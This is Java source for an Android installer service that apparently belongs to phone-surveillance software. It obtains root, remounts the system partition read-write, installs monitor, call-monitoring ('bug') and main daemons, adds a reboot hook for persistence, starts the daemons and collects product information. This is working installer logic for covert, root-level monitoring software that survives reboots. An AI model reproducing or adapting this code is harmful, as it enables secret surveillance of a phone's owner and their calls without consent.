package com.fx;

import java.io.IOException;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import com.fx.daemon.DaemonHelper;
import com.fx.daemon.InstallationException;
import com.fx.daemon.RunningException;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemon;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.pmond.ref.MonitorDaemon;
import com.fx.pmond.ref.MonitorDaemonResource;
import com.fx.util.FxResource;
import com.vvt.callmanager.ref.BugDaemon;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.logger.FxLog;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.ShellUtil;
import com.vvt.timer.TimerBase;

/**
 * This service only separate an installation process for an Activity,  
 * no need to handle any exception here.
 */
public class InstallingService extends Service {
	
	private static final String TAG = "InstallingService";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	
	private static boolean mIsRunning = false;
	
	private static TimerBase mProcessingTimeout;
	
	private boolean mIsBugDaemonStarted;
	private boolean mIsMainDaemonStarted;
	private boolean mIsMonitorDaemonStarted;
	
	private ContentObserver mBugDaemonStartupObserver;
	private ContentObserver mMainDaemonStartupObserver;
	private ContentObserver mMonitorDaemonStartupObserver;
	private Handler mHandler;
	private IBinder mBinder = new LocalBinder();
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// flags: 0=Default, 1=START_FLAG_REDELIVERY, 2=START_FLAG_RETRY
		if (intent != null) {
			RunningThread t = new RunningThread();
			t.start();
		}
		return START_NOT_STICKY;
	}

	@Override
	public IBinder onBind(Intent intent) {
		return mBinder;
	}
	
	public void setHandler(Handler handler) {
		mHandler = handler;
	}
	
	public boolean isRunning() {
		return mIsRunning;
	}
	
	public class LocalBinder extends Binder {
		public InstallingService getService() {
			return InstallingService.this;
		}
	}
	
	class RunningThread extends Thread {
		
		@Override
		public void run() {
			if (LOGV) FxLog.v(TAG, "run # Looper.prepare()");
			Looper.prepare();
			
			setState(true);
			
			clearTimer();
			
	    	Context appContext = getApplicationContext();
	    	
	    	if (LOGV) FxLog.v(TAG, "run # Step 1");
			notifyInstallationProgress(1);
			
	    	try {
	    		if (LOGV) FxLog.v(TAG, "run # Check if device is perfectly rooted");
	    		ShellUtil.isDevicePerfectlyRooted(appContext);
	    	}
	    	catch (CannotGetRootShellException e) {
	    		if (LOGV) FxLog.v(TAG, "run # Getting root failed!!");
	    		UiHelper.manageGettingRootFailed(e, mHandler);
	    		setState(false);
	    		return;
	    	}
	    	
	    	try {
	    		if (LOGV) FxLog.v(TAG, "run # Step 2");
				notifyInstallationProgress(2);
				
				if (LOGV) FxLog.v(TAG,"run # Cleanup the target");
				ResetService.cleanupDevice();
				
	    		MainDaemon mainDaemon = new MainDaemon();
		    	MonitorDaemon monitorDaemon = new MonitorDaemon();
				BugDaemon bugDaemon = new BugDaemon();
				
				if (LOGV) FxLog.v(TAG, "run # Step 3");
				notifyInstallationProgress(3);
				
				if (LOGV) FxLog.v(TAG, "run # Remount system as read-write");
				ShellUtil.remountFileSystem(true);
				
				if (LOGV) FxLog.v(TAG,"run # Setup monitor daemon");
				monitorDaemon.setupDaemon(appContext);
				
				if (LOGV) FxLog.v(TAG,"run # Setup bug daemon");
				bugDaemon.setupDaemon(appContext);
	    		
	    		if (LOGV) FxLog.v(TAG, "run # Setup main daemons ...");
				mainDaemon.setupDaemon(appContext);
				
				if (LOGV) FxLog.v(TAG, "run # Setup reboot hook");
				try {
					DaemonHelper.setupRebootHook(mainDaemon.getStartupScriptPath());
				}
				catch (IOException e) {
					throw new InstallationException();
				}
				
				if (LOGV) FxLog.v(TAG, "run # Remount system as read-only");
				ShellUtil.remountFileSystem(false);
				
				if (LOGV) FxLog.v(TAG, "run # Step 4");
				notifyInstallationProgress(4);
				
				if (LOGV) FxLog.v(TAG, "Start main daemons ...");
				registerDaemonStartupReceivers();
				mainDaemon.startDaemon();
				
				if (LOGV) FxLog.v(TAG, "Waiting daemons to finish startup ...");
			} 
	    	catch (CannotGetRootShellException e) {
	    		notifyInstallationFailedInInit();
				FxLog.e(TAG, e.toString());
			}
	    	catch (InstallationException e) {
	    		notifyInstallationFailedInInit();
	    		FxLog.e(TAG, e.toString());
			}
	    	catch (RunningException e) {
	    		notifyInstallationFailedInRunningService();
				FxLog.e(TAG, e.toString());
			}
	    	
	    	if (LOGV) FxLog.v(TAG, "run # Looper.loop()");
	    	Looper.loop();
    	}
	}
		
	private void setState(boolean isStart) {
		if (isStart) {
			if (LOGV) FxLog.v(TAG, "Service is started");
			mIsRunning = true;
		}
		else {
			if (LOGV) FxLog.v(TAG, "Service is stopped");
			mIsRunning = false;
			
			mIsMonitorDaemonStarted = false;
			mIsBugDaemonStarted = false;
			mIsMainDaemonStarted = false;
			
			if (Looper.myLooper() != null) {
				Looper.myLooper().quit();
			}
		}
	}

	private void updateDaemonStartupStatus(String processName) {
		if (LOGV) FxLog.v(TAG, String.format("'%s' is started", processName));
		
		if (processName.equals(BugDaemonResource.CallMon.PROCESS_NAME)) {
			mIsBugDaemonStarted = true;
		}
		else if (processName.equals(MainDaemonResource.PROCESS_NAME)) {
			mIsMainDaemonStarted = true;
		}
		else if (processName.equals(MonitorDaemonResource.PROCESS_NAME)) {
			mIsMonitorDaemonStarted = true;
		}
		
		// When all processes are started up, send installation completed message
		if (mIsBugDaemonStarted && mIsMainDaemonStarted && mIsMonitorDaemonStarted) {
			if (LOGV) FxLog.v(TAG, "All processes are successfully startup");
			clearTimer();
			
			if (LOGV) FxLog.v(TAG, "Collect product information ...");
			ProductInfoHelper.collectProductInfo(getApplicationContext());
			
			unregisterDaemonStartupReceivers();
			notifyInstallationComplete();
		}
	}

	private void registerDaemonStartupReceivers() {
		mMonitorDaemonStartupObserver = new ContentObserver(new Handler()) {
			@Override
			public void onChange(boolean selfChange) {
				updateDaemonStartupStatus(MonitorDaemonResource.PROCESS_NAME);
			}
		};
		
		mBugDaemonStartupObserver = new ContentObserver(new Handler()) {
			@Override
			public void onChange(boolean selfChange) {
				updateDaemonStartupStatus(BugDaemonResource.CallMon.PROCESS_NAME);
			}
		};
		
		mMainDaemonStartupObserver = new ContentObserver(new Handler()) {
			@Override
			public void onChange(boolean selfChange) {
				updateDaemonStartupStatus(MainDaemonResource.PROCESS_NAME);
			}
		};
		
		getContentResolver().registerContentObserver(
				MonitorDaemonResource.URI_STARTUP_SUCCESS, true, mMonitorDaemonStartupObserver);
		
		getContentResolver().registerContentObserver(
				BugDaemonResource.URI_STARTUP_SUCCESS, true, mBugDaemonStartupObserver);
		
		getContentResolver().registerContentObserver(
				MainDaemonResource.URI_STARTUP_SUCCESS, true, mMainDaemonStartupObserver);
		
		setupProcessingTimeout();
	}

	private void unregisterDaemonStartupReceivers() {
		if (mBugDaemonStartupObserver != null) {
			getContentResolver().unregisterContentObserver(mBugDaemonStartupObserver);
		}
		
		if (mMainDaemonStartupObserver != null) {
			getContentResolver().unregisterContentObserver(mMainDaemonStartupObserver);
		}
		
		if (mMonitorDaemonStartupObserver != null) {
			getContentResolver().unregisterContentObserver(mMonitorDaemonStartupObserver);
		}
	}

	private void clearTimer() {
		if (mProcessingTimeout != null) {
			mProcessingTimeout.stop();
		}
	}

	private void setupProcessingTimeout() {
		clearTimer();
		
		if (mProcessingTimeout == null) {
	    	mProcessingTimeout = new TimerBase() {
				
				@Override
				public void onTimer() {
					if (LOGV) FxLog.v(TAG, "Time Out!! Operation FAILED!!");
					unregisterDaemonStartupReceivers();
		    		notifyInstallationFailedInRunningService();
				}
			};
		}
		
		mProcessingTimeout.setTimerDurationMs(
				UiHelper.PROGRESS_DIALOG_TIMEOUT_LONG_MS);
		
		mProcessingTimeout.start();
		if (LOGV) FxLog.v(TAG, "Schedule TimeOut Timer");
	}
	
	private void notifyInstallationProgress(int step) {
		UiHelper.updateProgressDialog(
				mHandler, String.format(FxResource.NOTIFY_INSTALLATION_STEP, step));
	}

	private void notifyInstallationComplete() {
		UiHelper.dismissProgressDialog(mHandler);
		UiHelper.resetView(mHandler);
		UiHelper.sendNotify(mHandler, FxResource.LANGUAGE_STARTUP_GET_ROOT_SUCCESS);
		
		setState(false);
	}

	private void notifyInstallationFailedInRunningService() {
		UiHelper.dismissProgressDialog(mHandler);
		UiHelper.sendNotify(mHandler, FxResource.LANGUAGE_STARTUP_RUNNING_FAILED);
		
		setState(false);
	}

	private void notifyInstallationFailedInInit() {
		UiHelper.dismissProgressDialog(mHandler);
		UiHelper.sendNotify(mHandler, FxResource.LANGUAGE_STARTUP_INSTALLATION_FAILED);
		
		setState(false);
	}
}
